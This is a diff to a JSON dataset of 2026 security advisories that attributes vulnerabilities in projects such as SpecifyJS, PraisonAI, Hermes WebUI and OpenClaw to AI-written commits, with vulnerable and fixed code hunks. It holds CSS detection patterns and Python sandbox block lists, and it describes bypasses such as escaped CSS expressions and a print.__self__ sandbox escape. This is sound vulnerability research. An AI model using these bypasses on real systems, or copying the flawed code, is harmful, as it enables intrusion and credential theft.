+      "code": "@@ -304,10 +304,15 @@ function renderStyle(style: Record<string, string | number>): string {\n         ? `${value}px`\n         : String(value);\n \n-    // L-6: Sanitize CSS values — strip dangerous patterns\n-    cssValue = cssValue\n-      .replace(/expression\\s*\\(/gi, '')\n-      .replace(/url\\s*\\(\\s*javascript:/gi, 'url(');\n+    // L-6: Reject CSS values containing dangerous patterns.\n+    // Normalize unicode escapes and strip CSS comments before checking\n+    // to prevent bypass via \\65xpression( or exp/**/ression( patterns.\n+    const normalizedCss = cssValue\n+      .replace(/\\\\[0-9a-fA-F]{1,6}\\s?/g, '_')\n+      .replace(/\\/\\*[\\s\\S]*?\\*\\//g, '');\n+    if (/expression\\s*\\(|javascript\\s*:|behavior\\s*:|moz-binding|-o-link/i.test(normalizedCss)) {\n+      cssValue = '';\n+    }\n \n     parts.push(`${cssProp}:${cssValue}`);\n   }",
+      "file": "core/src/server/render-to-string.ts",
+      "role": "fix"
+     }
+    ],
+    "fix_url": "https://github.com/asymmetric-effort/specifyjs/commit/25d1fb491d99479efdf501f5f75e0bb80c908f0a",
+    "steps": [
+     {
+      "detail": "A Claude-coauthored SAST cleanup added the CSS sanitizer that deleted literal expression( and url(javascript: substrings from style values, a guard that left escape-sequence and comment-split spellings of the same payload intact.",
+      "title": "AI change"
+     },
+     {
+      "detail": "Version 0.2.136 replaces the deletion with a check that normalizes unicode escapes and removes CSS comments before matching expression, javascript, behavior, -moz-binding and -o-link patterns, and blanks the value when a match is found.",
+      "title": "Fix"
+     }
+    ],
+    "summary": "SpecifyJS pre-rendering on 0.2.135 and earlier sanitized style values by deleting the literal strings expression( and url(javascript:, so escaped or comment-split spellings of the same payload survived into the style attribute of the rendered markup."
+   },
+   "ir_chain": {
+    "original_advisory_ids": [
+     "GHSA-93Q6-WWJH-JC6H"
+    ],
+    "original_mechanism": "Untrusted text reached the style attribute of server-rendered HTML with no CSS sanitization on the path at all.",
+    "original_sink": "renderStyle() style attribute construction in core/src/server/render-to-string.ts",
+    "original_author_kind": "AI",
+    "original_author_name": "Sam Caldwell",
+    "original_sha": "56749d121bcbc26d1905db2e326b808ef8cce02e",
+    "unresolved_reason": null,
+    "attempted_remediation": {
+     "candidate_shas": [
+      "caa8fbfa4d7d99e02dca3ee0df642b30a5d856cc"
+     ],
+     "changed": "Deleted the literal expression( and url(javascript: substrings from every style value.",
+     "missed": "CSS escape sequences and comment-split spellings of the same payload survived the deletion."
+    },
+    "residual_bypass": "A value written as an escaped or comment-split expression( still reached the browser as a live expression at v0.2.136.",
+    "final_closure": {
+     "closed": "Normalizes unicode escapes, strips CSS comments and rejects expression/javascript/behavior/-moz-binding/-o-link; v0.2.137 decodes hex escapes to real characters so the escaped spellings are detected as well.",
+     "minimum_fix_shas": [
+      "25d1fb491d99479efdf501f5f75e0bb80c908f0a",
+      "293124c51bf797c0f5cdae32981110545850a893"
+     ]
+    }
+   },
+   "unpatched": null,
+   "advisory_url": "https://github.com/advisories/ghsa-93q6-wwjh-jc6h",
+   "publication_issues": [],
+   "publication_status": "confirmed"
+  },
+  {
    "case_id": "GHSA-5C7W-4WM3-85VW",
    "aliases": [],
    "repository": "asymmetric-effort/specifyjs",
@@ -13401,12 +13829,12 @@
     "25d1fb491d99479efdf501f5f75e0bb80c908f0a"
    ],
    "gates": {
-    "identity": "PASS",
     "ai_hunk": "PASS",
-    "topology": "PASS",
     "but_for": "PASS",
     "fix_reversal": "PASS",
+    "identity": "PASS",
     "release": "PASS",
+    "topology": "PASS",
     "uniqueness": "PASS"
    },
    "vulnerable_release": {
@@ -13461,27 +13889,16 @@
    "fix_authorship": {
     "classification": "ai_assisted",
     "families": [
-     "claude_code"
+     "claude"
     ],
     "fixes": [
      {
-      "author": {
-       "email": "github@samcaldwell.net",
-       "name": "Sam Caldwell"
-      },
-      "authored_at": "2026-05-29T02:58:11+00:00",
+      "sha": "25d1fb491d99479efdf501f5f75e0bb80c908f0a",
       "classification": "ai_assisted",
-      "evidence": [
-       {
-        "family": "claude_code",
-        "kind": "coauthor_trailer",
-        "text": "Co-Authored-By: Claude Opus 4.6 (1M context) <noreply@anthropic.com>"
-       }
-      ],
-      "families": [
-       "claude_code"
-      ],
-      "sha": "25d1fb491d99479efdf501f5f75e0bb80c908f0a"
+      "author": {
+       "name": "Sam Caldwell",
+       "email": "github@samcaldwell.net"
+      }
      }
     ]
    },
@@ -13527,20 +13944,8 @@
       "role": "fix"
      }
     ],
-    "fix_marker": null,
     "fix_patch_sha256": "97b6dd3693e913815e327db8989d03626f2e2353d6dde02d1943ac8df0826e0e",
     "fix_url": "https://github.com/asymmetric-effort/specifyjs/commit/25d1fb491d99479efdf501f5f75e0bb80c908f0a",
-    "annotation_mode": "hunk_specific",
-    "required_anchors": {
-     "candidate": [
-      "TemplateStringsArray",
-      "createGraphQLClient"
-     ],
-     "fix": [
-      "TemplateStringsArray",
-      "assertSecureUrl"
-     ]
-    },
     "steps": [
      {
       "detail": "security: fix all SAST findings (Critical through Low)",
@@ -13572,10 +13977,10 @@
     },
     "residual_bypass": "A warned metacharacter payload still reached the GraphQL query sink.",
     "final_closure": {
+     "closed": "Changed the warning path to throw before query construction.",
      "minimum_fix_shas": [
       "25d1fb491d99479efdf501f5f75e0bb80c908f0a"
-     ],
-     "closed": "Changed the warning path to throw before query construction."
+     ]
     }
    },
    "unpatched": null,
@@ -18987,6 +19392,122 @@
    "publication_status": "confirmed"
   },
   {
+   "case_id": "GHSA-P52P-4VMG-4VQ3",
+   "aliases": [
+    "CVE-2026-49973"
+   ],
+   "repository": "nesquena/hermes-webui",
+   "repository_metadata": {
+    "full_name": "nesquena/hermes-webui",
+    "language": "Python",
+    "archived": false
+   },
+   "contribution_class": "AI_DIRECT_ROOT",
+   "candidate_set": [
+    "b8b62722ec2f6b3cd394737ab409c35650f29ca6"
+   ],
+   "carrier_set": [],
+   "minimum_fix_set": [
+    "f2ef2851d389cf7a41308dcf0180d7cfbe446379"
+   ],
+   "gates": {
+    "ai_hunk": "PASS",
+    "but_for": "PASS",
+    "fix_reversal": "PASS",
+    "identity": "PASS",
+    "release": "PASS",
+    "topology": "PASS",
+    "uniqueness": "PASS"
+   },
+   "vulnerable_release": {
+    "contains_candidate_ancestor": true,
+    "contains_fix_ancestor": false,
+    "kind": "git_tag",
+    "sha": "279690e4c18eaa79a2df6530a78c6187f46da6f2",
+    "tag": "v0.28.1"
+   },
+   "fixed_release": {
+    "contains_fix_ancestor": true,
+    "kind": "git_tag",
+    "sha": "1126e541325d401538f6a272a9c024c37d47ae08",
+    "tag": "v0.51.358"
+   },
+   "published_at": "2026-06-11",
+   "severity": null,
+   "cwes": [],
+   "description": "This WebUI ships with optional password auth switched off, so every request is allowed through until an operator sets a password. The same change that added passwords taught the already generic settings endpoint to read a private _set_password field, hash the value and persist it as password_hash, with no check on where the request came from. Anyone able to reach the port during the first-run window could therefore install their own password, log in with it, and leave the intended operator outside their own instance. The fix captures the auth state at the start of the request and refuses a first-password write from a non-local client while auth is still disabled; local and private-network clients still work, and an operator can opt in to remote bootstrap on purpose.",
+   "references": [],
+   "mechanism": "On a fresh instance no password is configured, so the request check admits every client by design. The generic settings endpoint still honoured a private _set_password field: it hashed the caller's value into settings.json as password_hash, which switches authentication on, and the caller could then sign in with the password they had chosen. The repair refuses first-password setup from a non-local client while auth is disabled, unless the operator deliberately opens remote bootstrap.",
+   "cause_category": "auth_access",
+   "ai_provenance": {
+    "family": "claude",
+    "coverage": "complete",
+    "candidate_count": 1,
+    "named_candidate_count": 1
+   },
+   "fix_authorship": {
+    "classification": "ai_assisted",
+    "families": [],
+    "fixes": [
+     {
+      "sha": "f2ef2851d389cf7a41308dcf0180d7cfbe446379",
+      "classification": "ai_assisted",
+      "author": {
+       "name": "Hermes Agent",
+       "email": "hermes-agent@nesquena-hermes.local"
+      }
+     }
+    ]
+   },
+   "code_evidence": {
+    "advisory_url": "https://github.com/advisories/ghsa-p52p-4vmg-4vq3",
+    "candidate_patch_sha256": "e03701ce05c59260f72e0870f43aea235a9c3011183277b42bf054a9d94b1e3a",
+    "candidate_url": "https://github.com/nesquena/hermes-webui/commit/b8b62722ec2f6b3cd394737ab409c35650f29ca6",
+    "display_hunks": [
+     {
+      "annotation": "the change teaches the generic settings writer to treat an unauthenticated _set_password value as the instance password and hash it straight into settings.json.",
+      "code": "@@ -595,6 +595,7 @@ _SETTINGS_DEFAULTS = {\n     'default_model': DEFAULT_MODEL,\n     'default_workspace': str(DEFAULT_WORKSPACE),\n     'send_key': 'enter',  # 'enter' or 'ctrl+enter'\n+    'password_hash': None,  # SHA-256 hash; None = auth disabled\n }\n \n def load_settings() -> dict:\n@@ -616,7 +617,13 @@ _SETTINGS_ENUM_VALUES = {\n \n def save_settings(settings: dict) -> dict:\n     \"\"\"Save settings to disk. Returns the merged settings. Ignores unknown keys.\"\"\"\n+    import hashlib as _hl\n     current = load_settings()\n+    # Handle _set_password: hash and store as password_hash\n+    raw_pw = settings.pop('_set_password', None)\n+    if raw_pw and isinstance(raw_pw, str) and raw_pw.strip():\n+        salt = str(STATE_DIR).encode()\n+        current['password_hash'] = _hl.sha256(salt + raw_pw.strip().encode()).hexdigest()\n     for k, v in settings.items():\n         if k in _SETTINGS_ALLOWED_KEYS:\n             # Validate enum-constrained keys",
+      "file": "api/config.py",
+      "role": "candidate"
+     },
+     {
+      "annotation": "the new request check reports success whenever no password is configured yet, so the very bootstrap request that writes the first password also passes that check.",
+      "code": "@@ -0,0 +1,149 @@\n+def check_auth(handler, parsed):\n+    \"\"\"Check if request is authorized. Returns True if OK.\n+    If not authorized, sends 401 (API) or 302 redirect (page) and returns False.\"\"\"\n+    if not is_auth_enabled():\n+        return True\n+    # Public paths don't require auth\n+    if parsed.path in PUBLIC_PATHS or parsed.path.startswith('/static/'):\n+        return True\n+    # Check session cookie\n+    cookie_val = parse_cookie(handler)\n+    if cookie_val and verify_session(cookie_val):\n+        return True\n+    # Not authorized\n+    if parsed.path.startswith('/api/'):\n+        handler.send_response(401)\n+        handler.send_header('Content-Type', 'application/json')\n+        handler.end_headers()\n+        handler.wfile.write(b'{\"error\":\"Authentication required\"}')\n+    else:\n+        handler.send_response(302)\n+        handler.send_header('Location', '/login')\n+        handler.end_headers()\n+    return False",
+      "file": "api/auth.py",
+      "role": "candidate"
+     },
+     {
+      "annotation": "a first-password write from a non-local client is refused while auth is still disabled, judged against the auth state captured at the start of the request.",
+      "code": "@@ -8322,6 +8323,21 @@ def handle_post(handler, parsed) -> bool:\n                     \"Unset the env var and restart the server before changing the password here.\",\n                     409,\n                 )\n+\n+        # First password creation decides who owns a previously passwordless\n+        # WebUI. While auth is disabled, the generic /api/settings route is also\n+        # unauthenticated, so gate bootstrap password setup the same way as\n+        # onboarding setup: local/private networks only, unless the operator\n+        # explicitly opts into remote bootstrap with HERMES_WEBUI_ONBOARDING_OPEN.\n+        if requested_password and not auth_enabled_before:\n+            if not _onboarding_gate_allows(handler, auth_enabled_before):\n+                return bad(\n+                    handler,\n+                    \"First password setup is only available from local networks when auth is not enabled. \"\n+                    \"To bootstrap this on a remote server, set HERMES_WEBUI_ONBOARDING_OPEN=1.\",\n+                    403,\n+                )\n+\n         if requested_passwordless:\n             from api.auth import _passkey_feature_flag_enabled\n             from api.passkeys import registered_credentials",
+      "file": "api/routes.py",
+      "role": "fix"
+     }
+    ],
+    "fix_patch_sha256": "3decb1624561d9a0600a9fadab228610d86b18a41b7437aefb8a7cb7182c6fe0",
+    "fix_url": "https://github.com/nesquena/hermes-webui/commit/f2ef2851d389cf7a41308dcf0180d7cfbe446379",
+    "steps": [
+     {
+      "detail": "The settings writer was taught to take an unauthenticated _set_password value as the instance credential, hashing it into settings.json and switching authentication on with a password the caller chose.",
+      "title": "AI change"
+     },
+     {
+      "detail": "While no password is configured the request check admits every client and the settings endpoint is deliberately reachable, so a remote first caller could claim ownership of the instance.",
+      "title": "Reachable window"
+     },
+     {
+      "detail": "First-password setup is now refused for a non-local client while auth is still disabled, judged against the auth state captured at the start of the request, while local setup and an explicit operator opt-in keep working.",
+      "title": "Fix"
+     }
+    ],
+    "summary": "An AI-assisted change let the ordinary settings request install the first password of a passwordless Hermes WebUI, so a remote caller who reached the port during first run could choose the owner credential and lock the operator out."
+   },
+   "ir_chain": null,
+   "unpatched": null,
+   "advisory_url": "https://github.com/advisories/ghsa-p52p-4vmg-4vq3",
+   "publication_issues": [],
+   "publication_status": "confirmed"
+  },
+  {
    "case_id": "GHSA-5GVR-V6QV-H5MM",
    "aliases": [
     "CVE-2026-11330"
@@ -20386,6 +20907,143 @@
    },
    "unpatched": null,
    "advisory_url": "https://github.com/advisories/ghsa-5c6w-wwfq-7qqm",
+   "publication_issues": [],
+   "publication_status": "confirmed"
+  },
+  {
+   "case_id": "GHSA-4MR5-G6F9-CFRH",
+   "aliases": [
+    "CVE-2026-47392"
+   ],
+   "repository": "mervinpraison/praisonai",
+   "repository_metadata": {
+    "full_name": "mervinpraison/praisonai",
+    "language": "Python",
+    "archived": false
+   },
+   "contribution_class": "AI_INCOMPLETE_REMEDIATION",
+   "candidate_set": [
+    "dd41c1ba017d120e58be6d555a9c2fd849853b93"
+   ],
+   "carrier_set": [],
+   "minimum_fix_set": [
+    "179cab02dbec0c1e9b601507a65908e079876004"
+   ],
+   "gates": {
+    "ai_hunk": "PASS",
+    "but_for": "PASS",
+    "fix_reversal": "PASS",
+    "identity": "PASS",
+    "release": "PASS",
+    "topology": "PASS",
+    "uniqueness": "PASS"
+   },
+   "vulnerable_release": {
+    "contains_candidate_ancestor": true,
+    "contains_fix_ancestor": false,
+    "kind": "git_tag",
+    "sha": "402d7ed9fc5926babaa70c97a6ee5353e3d0dd62",
+    "tag": "v4.6.39"
+   },
+   "fixed_release": {
+    "contains_fix_ancestor": true,
+    "kind": "git_tag",
+    "sha": "a72e156c4d01ef06c64529d302c21381d6485716",
+    "tag": "v4.6.40"
+   },
+   "published_at": "2026-05-29",
+   "severity": null,
+   "cwes": [],
+   "description": "PraisonAI lets an agent run Python through an execute_code helper. A change in the 1.6 line moved that execution into a separate process and reused the older checks, but the check that walks the syntax tree only knew a fixed list of dangerous attribute names, and the list missed the attribute through which a bound CPython builtin exposes the module it belongs to. Because the same change also stopped running the text-pattern list in the default sandbox mode, and because names assembled from short string pieces never look dangerous to a static reader, the whole guard could be stepped around with a handful of statements.\n\nAnyone able to steer code into the helper, directly or through an agent prompt, gets command execution with the permissions of the service account: the published proof runs the identity command inside the sandbox and prints its output. The hardened release adds the missing attribute and the helper call to the blocked sets, also screens calls written as attribute access rather than bare names, and runs the same syntax check on the way into the sandboxed path, so the proof is refused before it starts.",
+   "references": [],
+   "mechanism": "In sandbox mode the tool compiles the submitted program into a fresh subprocess after a static scan of its syntax tree. The scan refuses imports, a fixed set of attribute names and a few calls written as bare names, and it deliberately skips the text-pattern list that the older in-process mode uses. The safe builtins dictionary handed to the subprocess is built from the real CPython functions, and such a function carries a __self__ reference back to the builtins module, which the list never named. From that module a program can reach the import hook, load the os module and run shell commands with the privileges of the host process.",
+   "cause_category": "injection",
+   "ai_provenance": {
+    "family": "claude",
+    "coverage": "complete",
+    "candidate_count": 1,
+    "named_candidate_count": 1
+   },
+   "fix_authorship": {
+    "classification": "ai_assisted",
+    "families": [
+     "cursor"
+    ],
+    "fixes": [
+     {
+      "sha": "179cab02dbec0c1e9b601507a65908e079876004",
+      "classification": "ai_assisted",
+      "author": {
+       "name": "praison",
+       "email": "praison@users.noreply.github.com"
+      }
+     }
+    ]
+   },
+   "code_evidence": {
+    "advisory_url": "https://github.com/advisories/ghsa-4mr5-g6f9-cfrh",
+    "candidate_patch_sha256": "fdec14ff538e82669fd00d2421f51e13f4afd7db86fce84689207497ba4e3ccb",
+    "candidate_url": "https://github.com/mervinpraison/praisonai/commit/dd41c1ba017d120e58be6d555a9c2fd849853b93",
+    "display_hunks": [
+     {
+      "annotation": "The sandbox's syntax scan carries a short list of forbidden attribute names and blocks only bare-name calls, and neither rule covers the attribute that recovers the builtins module.",
+      "code": "@@ -78,25 +84,259 @@ def _validate_code_ast(code: str):\n+        # Block dangerous patterns\n+        blocked_attrs = {{\n+            '__subclasses__', '__bases__', '__mro__', '__globals__',\n+            '__code__', '__class__', '__dict__', '__builtins__',\n+            '__import__', '__loader__', '__spec__'\n+        }}\n+            if isinstance(node, ast.Attribute) and node.attr in blocked_attrs:\n+            if isinstance(node, ast.Call) and isinstance(node.func, ast.Name):\n+                if node.func.id in ('exec', 'eval', 'compile', '__import__', 'open'):",
+      "file": "src/praisonai-agents/praisonaiagents/tools/python_tools.py",
+      "role": "candidate"
+     },
+     {
+      "annotation": "The repair lengthens that list with the leaking attribute and the helper call, blocks attribute-style calls too, and moves the same scan into the sandboxed execution path.",
+      "code": "@@ -36,6 +36,30 @@ def _safe_getattr(obj, name, *default):\n     return getattr(obj, name, *default) if default else getattr(obj, name)\n \n \n+_SANDBOX_BLOCKED_ATTRS = frozenset({\n+    '__subclasses__', '__bases__', '__mro__', '__globals__',\n+    '__code__', '__class__', '__dict__', '__builtins__',\n+    '__import__', '__loader__', '__spec__', '__init_subclass__',\n+    '__set_name__', '__reduce__', '__reduce_ex__',\n+    '__traceback__', '__qualname__', '__module__',\n+    '__wrapped__', '__closure__', '__annotations__',\n+    '__self__',  # C builtins leak real builtins module (GHSA-4mr5-g6f9-cfrh)\n+    # Frame/code object introspection\n+    'gi_frame', 'gi_code', 'cr_frame', 'cr_code',\n+    'ag_frame', 'ag_code', 'tb_frame', 'tb_next',\n+    'f_globals', 'f_locals', 'f_builtins', 'f_code',\n+    'co_consts', 'co_names',\n+    '__getattribute__', '__getattr__', '__setattr__', '__delattr__',\n+    '__dir__', '__get__', '__set__', '__delete__',\n+})\n+\n+_SANDBOX_BLOCKED_CALLS = frozenset({\n+    'exec', 'eval', 'compile', '__import__',\n+    'open', 'input', 'breakpoint',\n+    'setattr', 'delattr', 'dir', 'vars',\n+})",
+      "file": "src/praisonai-agents/praisonaiagents/tools/python_tools.py",
+      "role": "fix"
+     }
+    ],
+    "fix_patch_sha256": "6ccec27104422e25fc9086ac785bed4f7d956609954ef4156f7f63a387b5c661",
+    "fix_url": "https://github.com/mervinpraison/praisonai/commit/179cab02dbec0c1e9b601507a65908e079876004",
+    "steps": [
+     {
+      "detail": "The change that moved code execution into a subprocess also wrote the list of forbidden attribute names, and that list never named the attribute that hands back the builtins module.",
+      "title": "AI change"
+     },
+     {
+      "detail": "The default sandbox mode skips the older text-pattern list, so the guard was the static syntax scan alone, and every release from the first subprocess-mode version through 1.6.39 shipped that list as written.",
+      "title": "Reachable window"
+     },
+     {
+      "detail": "The repair adds the leaking attribute and the helper call to the blocked sets, screens calls written as attribute access, and runs the same syntax check at the entry to sandboxed execution, so the proof is refused before it starts.",
+      "title": "Fix"
+     }
+    ],
+    "summary": "The execute_code tool's subprocess sandbox screened submitted programs against a fixed list of dangerous attribute names, and that list omitted the attribute that exposes the live builtins module, so a short program could still run operating system commands as the server user."
+   },
+   "ir_chain": {
+    "original_advisory_ids": [
+     "CVE-2026-47392",
+     "GHSA-4MR5-G6F9-CFRH"
+    ],
+    "original_mechanism": "execute_code handed caller-supplied Python to the interpreter with no sandbox wrapper and no attribute screen, so a snippet could reach interpreter internals such as the builtins module.",
+    "original_sink": "execute_code in src/praisonai-agents/praisonaiagents/tools/python_tools.py",
+    "original_author_kind": "AI",
+    "original_author_name": "Claude Code",
+    "original_sha": "dd41c1ba017d120e58be6d555a9c2fd849853b93",
+    "unresolved_reason": null,
+    "attempted_remediation": {
+     "candidate_shas": [
+      "dd41c1ba017d120e58be6d555a9c2fd849853b93"
+     ],
+     "changed": "Added the _execute_code_sandboxed subprocess wrapper with a blocked_attrs screen and a restricted builtins dictionary, and made sandbox mode the default.",
+     "missed": "The attribute screen listed the usual dunder names but not __self__, so a bound method still leaked its module: print.__self__ handed the snippet the builtins module."
+    },
+    "residual_bypass": "print.__self__ reached the builtins module through the attribute screen, so a sandboxed snippet could rebuild imports and leave the sandbox.",
+    "final_closure": {
+     "closed": "Blocks __self__ and vars and validates the snippet's AST before execution ('Security Error: Access to attribute __self__ is restricted').",
+     "minimum_fix_shas": [
+      "179cab02dbec0c1e9b601507a65908e079876004"
+     ]
+    }
+   },
+   "unpatched": null,
+   "advisory_url": "https://github.com/advisories/ghsa-4mr5-g6f9-cfrh",
    "publication_issues": [],
    "publication_status": "confirmed"
   },
@@ -29611,137 +30269,6 @@
    "publication_status": "confirmed"
   },
   {
-   "case_id": "GHSA-68V4-HMWV-F43H",
-   "aliases": [
-    "CVE-2026-41345"
-   ],
-   "repository": "openclaw/openclaw",
-   "repository_metadata": {
-    "full_name": "openclaw/openclaw",
-    "language": "TypeScript",
-    "archived": false
-   },
-   "contribution_class": "AI_DIRECT_ROOT",
-   "candidate_set": [
-    "06dd9b8ed864eb6668d42c497f0615e743da483a"
-   ],
-   "carrier_set": [],
-   "minimum_fix_set": [
-    "f865a5455ee03924a444e9ba0f1c4743d8fb6566"
-   ],
-   "gates": {
-    "identity": "PASS",
-    "ai_hunk": "PASS",
-    "topology": "PASS",
-    "but_for": "PASS",
-    "fix_reversal": "PASS",
-    "release": "PASS",
-    "uniqueness": "PASS"
-   },
-   "vulnerable_release": {
-    "contains_candidate_ancestor": true,
-    "contains_fix_ancestor": false,
-    "kind": "npm_githead",
-    "sha": "06dd9b8ed864eb6668d42c497f0615e743da483a",
-    "tag": "v2026.3.28"
-   },
-   "fixed_release": {
-    "contains_fix_ancestor": true,
-    "kind": "npm_githead",
-    "sha": "f865a5455ee03924a444e9ba0f1c4743d8fb6566",
-    "tag": "v2026.3.31"
-   },
-   "published_at": "2026-04-03",
-   "severity": "MEDIUM",
-   "cwes": [
-    "CWE-522",
-    "CWE-522 INSUFFICIENTLY PROTECTED CREDENTIALS"
-   ],
-   "description": "## Summary\nMedia download follows cross-origin redirects with Authorization headers intact\n\n## Current Maintainer Triage\n- Status: open\n- Normalized severity: medium\n- Assessment: Shipped v2026.3.28 media downloads forwarded Authorization across cross-origin redirects, a real in-scope credential-leak class that fits medium.\n\n## Affected Packages / Versions\n- Package: `openclaw` (npm)\n- Latest published npm version: `2026.3.31`\n- Vulnerable version range: `<=2026.3.28`\n- Patched versions: `>= 2026.3.31`\n- First stable tag containing the fix: `v2026.3.31`\n\n## Fix Commit(s)\n- `e704323ff388ed21f6963f9b8e0b1b8dfaaabc5f` — 2026-03-31T19:57:42+09:00\n\nOpenClaw thanks @AntAISecurityLab for reporting.",
-   "references": [
-    "https://github.com/openclaw/openclaw/security/advisories/GHSA-68v4-hmwv-f43h",
-    "https://github.com/openclaw/openclaw/commit/e704323ff388ed21f6963f9b8e0b1b8dfaaabc5f",
-    "https://github.com/openclaw/openclaw",
-    "https://github.com/openclaw/openclaw/releases/tag/v2026.3.31",
-    "https://www.vulncheck.com/advisories/openclaw-authorization-header-leak-via-cross-origin-redirect-in-media-download"
-   ],
-   "mechanism": "downloadToFile follows redirects while forwarding original Authorization-bearing headers; invariant: cross-origin redirects must drop unsafe headers.",
-   "cause_category": "ssrf_network",
-   "ai_provenance": {
-    "family": "claude",
-    "coverage": "complete",
-    "candidate_count": 1,
-    "named_candidate_count": 1
-   },
-   "fix_authorship": {
-    "classification": "no_ai_marker",
-    "families": [],
-    "fixes": [
-     {
-      "author": {
-       "email": "pgondhi@nvidia.com",
-       "name": "pgondhi987"
-      },
-      "authored_at": "2026-03-31T13:52:11+05:30",
-      "classification": "no_ai_marker",
-      "evidence": [],
-      "families": [],
-      "sha": "f865a5455ee03924a444e9ba0f1c4743d8fb6566"
-     }
-    ]
-   },
-   "code_evidence": {
-    "advisory_url": "https://github.com/advisories/ghsa-68v4-hmwv-f43h",
-    "candidate_patch_sha256": "dc5656b2153c66d84370d037d65c5b86d65568bbb50a56119ab854f379cb733f",
-    "candidate_url": "https://github.com/openclaw/openclaw/commit/06dd9b8ed864eb6668d42c497f0615e743da483a",
-    "display_hunks": [
-     {
-      "annotation": "downloadToFile follows 3xx redirects while carrying the original headers; the incoming Authorization header is preserved across a cross-origin hop, leaking credentials to the redirect target.",
-      "code": "--- a/src/media/store.ts\n+++ b/src/media/store.ts\n@@ -1,3 +1,5 @@\n+// ABOUTME: Media storage utilities - downloads from URLs and saves to disk\n+// ABOUTME: Handles both remote URLs (with redirect support) and local file paths\n import crypto from \"node:crypto\";\n import { createWriteStream } from \"node:fs\";\n import fs from \"node:fs/promises\";\n@@ -48,9 +50,21 @@ async function downloadToFile(\n url: string,\n dest: string,\n headers?: Record<string, string>,\n+ maxRedirects = 5,\n ): Promise<{ headerMime?: string; sniffBuffer: Buffer; size: number }> {\n return await new Promise((resolve, reject) => {\n const req = request(url, { headers }, (res) => {\n+ // Follow redirects\n+ if (res.statusCode && res.statusCode >= 300 && res.statusCode < 400) {\n+ const location = res.headers.location;\n+ if (!location || maxRedirects <= 0) {\n+ reject(new Error(`Redirect loop or missing Location header`));\n+ return;\n+ }\n+ const redirectUrl = new URL(location, url).href;\n+ resolve(downloadToFile(redirectUrl, dest, headers, maxRedirects - 1));\n+ return;\n+ }\n if (!res.statusCode || res.statusCode >= 400) {\n reject(new Error(`HTTP ${res.statusCode ?? \"?\"} downloading media`));\n return;",
-      "file": "src/media/store.ts",
-      "role": "candidate"
-     },
-     {
-      "annotation": "Fix recomputes redirect headers: same-origin keeps them, cross-origin passes them through retainSafeHeadersForCrossOriginRedirectHeaders, dropping sensitive headers like Authorization.",
-      "code": "--- a/src/media/store.ts\n+++ b/src/media/store.ts\n@@ -6,6 +6,7 @@ import { request as httpsRequest } from \"node:https\";\n import path from \"node:path\";\n import { pipeline } from \"node:stream/promises\";\n import { SafeOpenError, readLocalFileSafely } from \"../infra/fs-safe.js\";\n+import { retainSafeHeadersForCrossOriginRedirectHeaders } from \"../infra/net/fetch-guard.js\";\n import { resolvePinnedHostname } from \"../infra/net/ssrf.js\";\n import { resolveConfigDir } from \"../utils.js\";\n import { detectMime, extensionForMime } from \"./mime.js\";\n@@ -207,7 +208,11 @@ async function downloadToFile(\n return;\n }\n const redirectUrl = new URL(location, url).href;\n- resolve(downloadToFile(redirectUrl, dest, headers, maxRedirects - 1));\n+ const redirectHeaders =\n+ new URL(redirectUrl).origin === parsedUrl.origin\n+ ? headers\n+ : retainSafeHeadersForCrossOriginRedirectHeaders(headers);\n+ resolve(downloadToFile(redirectUrl, dest, redirectHeaders, maxRedirects - 1));\n return;\n }\n if (!res.statusCode || res.statusCode >= 400) {",
-      "file": "src/media/store.ts",
-      "role": "fix"
-     }
-    ],
-    "fix_marker": null,
-    "fix_patch_sha256": "fbdac5510caaa014a5a48c0df7368161f7205f5f095a133e170801874f264329",
-    "fix_url": "https://github.com/openclaw/openclaw/commit/f865a5455ee03924a444e9ba0f1c4743d8fb6566",
-    "annotation_mode": "hunk_specific",
-    "required_anchors": {
-     "candidate": [
-      "createWriteStream",
-      "downloadToFile"
-     ],
-     "fix": [
-      "retainSafeHeadersForCrossOriginRedirectHeaders",
-      "resolvePinnedHostname"
-     ]
-    },
-    "steps": [
-     {
-      "detail": "fix: follow redirects when downloading Twilio media",
-      "title": "AI change"
-     },
-     {
-      "detail": "fix(media): drop sensitive headers on cross-origin redirects [AI] (#58156)",
-      "title": "Fix"
-     }
-    ],
-    "summary": "AI-written media-download code followed cross-origin redirects while keeping Authorization headers, leaking credentials to unintended origins.",
-    "mechanism": "downloadToFile follows redirects while forwarding original Authorization-bearing headers; invariant: cross-origin redirects must drop unsafe headers."
-   },
-   "ir_chain": null,
-   "unpatched": null,
-   "advisory_url": "https://github.com/advisories/ghsa-68v4-hmwv-f43h",
-   "publication_issues": [],
-   "publication_status": "confirmed"
-  },
-  {
    "case_id": "GHSA-RG8M-3943-VM6Q",
    "aliases": [
     "CVE-2026-41376"
@@ -31762,6 +32289,114 @@
    "publication_status": "confirmed"
   },
   {
+   "case_id": "GHSA-RQP8-Q22P-5J9Q",
+   "aliases": [
+    "CVE-2026-35635"
+   ],
+   "repository": "openclaw/openclaw",
+   "repository_metadata": {
+    "full_name": "openclaw/openclaw",
+    "language": "TypeScript",
+    "archived": false
+   },
+   "contribution_class": "AI_NEW_SURFACE_CONTRIBUTOR",
+   "candidate_set": [
+    "03586e3d0057b5975090d50dadcc5bc95b51f977"
+   ],
+   "carrier_set": [
+    "9a3800d8e6e69bc0a125dca5760d47515e746454"
+   ],
+   "minimum_fix_set": [
+    "980940aa58f862da4e19372597bbc2a9f268d70b"
+   ],
+   "gates": {
+    "ai_hunk": "PASS",
+    "but_for": "PASS",
+    "fix_reversal": "PASS",
+    "identity": "PASS",
+    "release": "PASS",
+    "topology": "PASS",
+    "uniqueness": "PASS"
+   },
+   "vulnerable_release": {
+    "contains_candidate_ancestor": true,
+    "contains_fix_ancestor": false,
+    "kind": "git_tag",
+    "sha": "a54dc7fe80fc02e2a02e6901668a468fcb0cf8b4",
+    "tag": "v2026.2.22"
+   },
+   "fixed_release": {
+    "contains_fix_ancestor": true,
+    "kind": "git_tag",
+    "sha": "e7d11f6c33e223a0dd8a21cfe01076bd76cef87a",
+    "tag": "v2026.3.22"
+   },
+   "published_at": "2026-03-26",
+   "severity": null,
+   "cwes": [],
+   "description": "Synology Chat supports several accounts under one channel, each with its own token, sender allowlist and direct-message policy. The account resolver merged each account's overrides over the channel configuration and let the webhook path fall back to the channel value, or to a fixed default when the channel set none, so a second account that did not name its own path came out with the same address as the first. The route registry keeps one handler per address, so the accounts shared a single route and the account that owned it answered for the others under its own rules. The channel first shipped in release 2026.2.22 and the behaviour is present through release 2026.3.13-1; the repair published in release 2026.3.22 refuses inherited and duplicate webhook paths at startup and stops replacing an existing route.",
+   "references": [],
